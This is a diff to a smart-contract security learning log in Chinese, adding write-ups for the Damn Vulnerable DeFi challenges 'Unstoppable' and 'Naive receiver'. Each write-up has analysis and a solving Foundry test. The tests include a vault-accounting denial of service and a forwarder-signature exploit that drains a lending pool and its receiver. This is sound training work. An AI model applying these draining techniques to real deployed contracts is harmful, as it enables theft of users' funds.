@@ -878,4 +878,216 @@ bytes memory data = hex"30c13ade000000000000000000000000000000000000000000000000
 - [Ethernaut31-Stake.s.sol](/Writeup/DeletedAccount/Ethernaut31-Stake.s.sol)
 
 
+### 2024.09.12
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-01] Unstoppable
+
+- 過關條件: 使 `_isSolved()` 通過執行
+- 合約代碼解讀筆記:
+  - 從 `_isSolved()` 的代碼注視我們可以觀察到，我們需要使 `Monitor.checkFlashLoan()` 的 [vault.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableMonitor.sol#L41) 拋出 Error
+    - 這樣才能使 `Vault` 被 paused 並且 transferOwner 給 deployer
+  - 所以，我們基本上只需要重點關注 `Vault.flashLoan()` 裡面的漏洞即可，其他的程式碼大概都是煙霧彈
+  - 有四個地方可以讓 `Vault.flashLoan()` 執行過程中拋出錯誤
+    1. revert InvalidAmount(0);
+    2. revert UnsupportedCurrency();
+    3. revert InvalidBalance();
+    4. revert CallbackFailed();
+  - `revert InvalidAmount(0);` 這個不可能，因為 Monitor 已經在[這裡](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/unstoppable/Unstoppable.t.sol#L106)把 amount 寫死了
+  - `revert UnsupportedCurrency();` 也不可能，因為 Monitor 一樣在[這裡](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableMonitor.sol#L39)寫死了，這裡的 `.asset()` 是一個 `immutable`，完全沒有操縱的可能性
+  - `revert CallbackFailed();` 基本上也不太可能
+    - 因為看起來 `Monitor.UnexpectedFlashLoan()` error 也基本上沒辦法被 `Vault` 合約觸發到
+  - 唯一比較有機會的感覺是觸發 `revert InvalidBalance();`
+  - 這可能會需要我們操縱 `balanceBefore`
+  - 順帶一提，有 `balanceBefore` 但是沒有 `balanceAfter` 本身感覺就蠻奇怪的
+  - 已知 `balanceBefore` 可以視為 `asset.balanceOf(address(this))`
+  - 即: 在 `Vault` 提供呼叫者 flashLoan 之前，Vault 持有多少個 `asset`
+  - 現在思考的點: **如何使 Monitor 在呼叫 `Vault.flashLoan()` 的時候，使 [convertToShares(totalSupply) != balanceBefore](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableVault.sol#L85) 返回 True?**
+  - 我們從 `Vault` 的程式碼中可以觀察到一件事: **這個合約基本上不存在對 ERC4626 的 supply 和 shares 的額外操作**
+  - 那麼就意味著沒意外的話，我們可以認為 `convertToShares(totalSupply)` 是**樂觀地**假定返回值會始終等於 `Vault` 合約持有的 DVT 代幣數量
+  - 但萬一 Vault 持有的 DVT 代幣數量已經被操縱了呢？那麼 `convertToShares(totalSupply)` 的返回值就會和 `Vault` 合約實際持有的 DVT 代幣數量對不上
+  - 對不上的話，任何人來呼叫 `Vault.flashLoan()` 就都會拋出 `InvalidBalance()` Error
+- 解法整理:
+  - 利用關卡一開始發給我們的 10 顆 DVT 代幣
+  - 把這 10 顆 DVT 代幣轉帳給 `Vault` 合約
+  - 使它 `convertToShares(totalSupply) == balanceBefore == asset.balanceOf(address(this))` 對不上來
+  - 對不上來的時候，就會讓任何人(包含`Monitor`)呼叫 `Vault.flashLoan()` 時，拋出 `revert InvalidBalance();`
+  - 當 Monitor 遇到 `revert InvalidBalance();` error 的時候，就會把 `Vault` paused 掉、把 owner 轉回給 `deployer`
+- 解法代碼:
+
+```solidity
+function test_unstoppable() public checkSolvedByPlayer {
+    token.transfer(address(vault), 10e18);
+}
+```
+
+- 心得: 哎呀，解法其實超簡單，Damn Vulnerable DeFi 系列感覺是花更多時間在理解題目的代碼在寫什麼，蠻考驗 Code Review/Audit 的能力...
+
+- [DamnVulnerableDeFi-01-Unstoppable.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-01-Unstoppable.t.sol)
+
+### 2024.09.13
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-02] Naive receiver
+
+- 過關條件: 把 `NaiveReceiverPool` 和 `FlashLoanReceiver` 合約的 WETH 餘額全部轉到題目指定的 recovery 帳號
+  - `NaiveReceiverPool` 有 1000 顆 WETH
+  - `FlashLoanReceive` 有 10 顆 WETH
+- 合約代碼解讀筆記:
+  - 從題目名稱來猜測，這題大概率是一個"輸入參數未經驗證"之類的漏洞
+  - 既然要榨乾 `NaiveReceiverPool` 和 `FlashLoanReceiver` 合約的餘額，那首先看一下有沒有相關代碼可以觸發這件事
+  - 只有三個地方可以做到這件事:
+    1. [flashLoan() 函數的 weth.transfer(address(receiver), amount);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L50)
+    2. [flashLoan() 函數的 weth.transferFrom(address(receiver), address(this), amountWithFee);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L58) 可以把 `FlashLoanReceiver` 合約的餘額轉走
+    3. [withdraw() 函數的 weth.transfer(receiver, amount);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L72)
+  - `NaiveReceiverPool` 合約的 external 函數都沒有什麼訪問限制(沒有modifier)，只有驗證傳入的 `token` 是否為 WETH 而已
+  - `FlashLoanReceiver` 看起來有一個可能觸發 overflow/underflow 的地方 [amountToBeRepaid = amount + fee;](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/FlashLoanReceiver.sol#L31)
+    - 但是，實際上好像沒什麼用。
+    - 原本想讓 `FlashLoanReceiver` approve 10 顆 WETH 給 `NaiveReceiverPool`，然後 `NaiveReceiverPool` 就有 1000 + 10 WETH 可以被轉走。
+    - 這條路看起來是行不通的。畢竟 Pool 只是 transferFrom 了原本發起的借款額 + 1 顆 WETH，`FlashLoanReceiver` 原本持有的 10 顆還是會繼續留在 `FlashLoanReceiver`。
+  - 那麼，要把 `FlashLoanReceiver` 的 10 顆 WETH 榨乾，看起來只剩下透過 `flashLoan()` 的 `FIXED_FEE`，一點一點地把 Receiver 的 WETH 轉到 Pool 去。
+  - 所以 `FlashLoanReceiver` 需要發起 10 次 `flashLoan()` 來把自己的 WETH 當作 Fee 被 Pool 收繳走
+  - 然後我們再來想辦法把 `NaiveReceiverPool` 持有的 WETH 榨乾。
+  - 要把 `NaiveReceiverPool` 持有的 WETH 榨乾，從剛剛的分析我們可以知道透過 `flashLoan()` 基本上是行不通的。
+    - 因為即使 `transfer()` 1000 顆走，還是會被 `transferFrom()` 1000+1 顆回來
+  - 所以唯一的路剩下 `withdraw()`
+  - 我們先看 `totalDeposits -= amount;` 是否可能不夠扣
+  - [在 deploy `NaiveReceiverPool` 的時候，`totalDeposits` 也增加了 1000 顆 WETH](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/naive-receiver/NaiveReceiver.t.sol#L45)
+  - 所以，`totalDeposits` 應該會是 (部署時放進去的 1000 顆 WETH + `NaiveReceiver` 被收繳的手續費 10 顆 WETH) 
+    - 也就是說 `totalDeposits` 至少有 (1000 + 10)e18
+    - 足夠讓我們發起 `withdraw(amount=1010e18)` 了
+  - 再來要思考 `deposits[_msgSender()] -= amount;` 中存在的漏洞
+  - 從 [_msgSender() 的代碼](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L87) 中我們可以觀察到，當 caller 是 `BasicForwarder` 合約的時候，我們就有機會操縱 `_msgSender()` 的返回值
+  - `BasicForwarder` 基本上是要我們建構基於 EIP712 簽名過的 Request，然後 `BasicForwarder` 合約就會幫我們代為呼叫 Request
+  - Request 裡面要塞什麼？
+    - 利用 `multicall()` 幫我們做一系列動作
+      - 呼叫十次 `flashLoan(receiver=FlashLoanReceiver, token=WETH, amount=1e18, data="")` 函數 (為了把 Receiver 持有的 WETH 透過手續費的方式給到 Pool)
+      - 用 low-level call 的方式，呼叫 `withdraw(amount=1020e18, receiver=tx.origin)`，並且在 calldata 內附加 `deployer` 的地址
+        - 必須用 low-level call 的方式，才能使 `_msgSender()` 返回 `deployer` 的地址
+        - 以便於通過 `deposits[_msgSender()] -= amount;`
+  - 怎麼把 Request 塞給 `BasicForwarder.execute(Request calldata request, bytes calldata signature)`？
+    - `request.from` 是自己
+    - `request.target` 當然是 pool
+    - `request.value` 雖然可以使用 payable 但這邊用不到，所以塞 0 即可
+    - `request.gas` 隨便塞個大數都可以，就塞 3000m 好了
+    - `request.nonce` 因為我們在 Foundry 玩，用的是 test account，所以塞 0 就好
+    - `request.data` 按照上述所說，組成一個 `multicall()` 的呼叫
+    - `request.deadline` 不重要，給個大數或 `block.timestamp` 都可以
+  - 最後再依照 EIP712 的標準，算出 signature，應該就可以調用 `BasicForwarder.execute()` 來通過了
+
+將上述的解題想法組成一部分偽代碼
+
+1. 先組建 `NaiveReceiverPooll.multicall(bytes[] calldata data)` 的 ABI Calldata
+
+```solidity=
+# 已知會有 10 + 1 組 data
+
+# 前 10 組 - 用來把 receiver 的 WETH 透過手續費的方式，轉給 pool
+# flashLoan(receiver=FlashLoanReceiver, token=WETH, amount=1e18, data="")
+data[0] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[1] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[2] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[3] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[4] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[5] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[6] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[7] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[8] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[9] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[10] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+# 第 11 組 - 利用 _msgSender() 藏的後門，把 pool 的資金全部提走
+# withdraw(amount=1010e18, payable receiver=player) + address(deployer)
+data[11] = abi.encodeCall(pool.withdraw, (1000e18+10e18, payable(player)), deployer)
+```
+
+2. 把 `NaiveReceiverPooll.multicall(bytes[] calldata data)` 組成一個 `BasicForwarder.Request`
+
+```
+BasicForwarder.Request({
+  from: player,
+  value: 0,
+  gas: 30000000,
+  nonce: 0,
+  data: abi.encodeCall(pool.multicall, data),
+  deadline: type(uint256).max
+})
+```
+
+3. 算出 `BasicForwarder.Request` 的 signature
+
+```solidity
+digest = keccak256(abi.encodePacked(
+  "\x19\x01",
+   forwarder.domainSeparator(),
+   forwarder.getDataHash(request)
+))
+
+(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+bytes memory signature = abi.encodePacked(r, s, v);
+```
+
+4. 執行 `BasicForwarder.execute(request, signature);`
+5. 現在 player 應該持有所有的 WETH 了，轉去 `recovery` 帳號去，破關
+
+
+解答程式碼:
+```solidity
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+function test_naiveReceiver() public checkSolvedByPlayer {
+   bytes[] memory data = new bytes[](11);
+   BasicForwarder.Request memory request;
+   bytes memory signature;
+
+   //---------------
+
+   data[0] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[1] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[2] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[3] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[4] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[5] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[6] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[7] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[8] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[9] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (1010e18, payable(player))), deployer);
+
+   //---------------
+
+   request = BasicForwarder.Request({
+      from: player,
+      target: address(pool),
+      value: 0,
+      gas: 30000000,
+      nonce: 0,
+      data: abi.encodeCall(pool.multicall, (data)),
+      deadline: type(uint256).max
+   });
+
+   //---------------
+
+   bytes32 digest = keccak256(abi.encodePacked(
+      "\x19\x01",
+      forwarder.domainSeparator(),
+      forwarder.getDataHash(request)
+   ));
+
+   (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+
+   signature = abi.encodePacked(r, s, v);
+
+   //---------------
+
+   forwarder.execute(request, signature);
+   weth.transfer(recovery, 1010e18);
+}
+```
+
+- [DamnVulnerableDeFi-02-NaiveReceiver.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-02-NaiveReceiver.t.sol)
+
+- 有點燒腦...
+
 <!-- Content_END -->
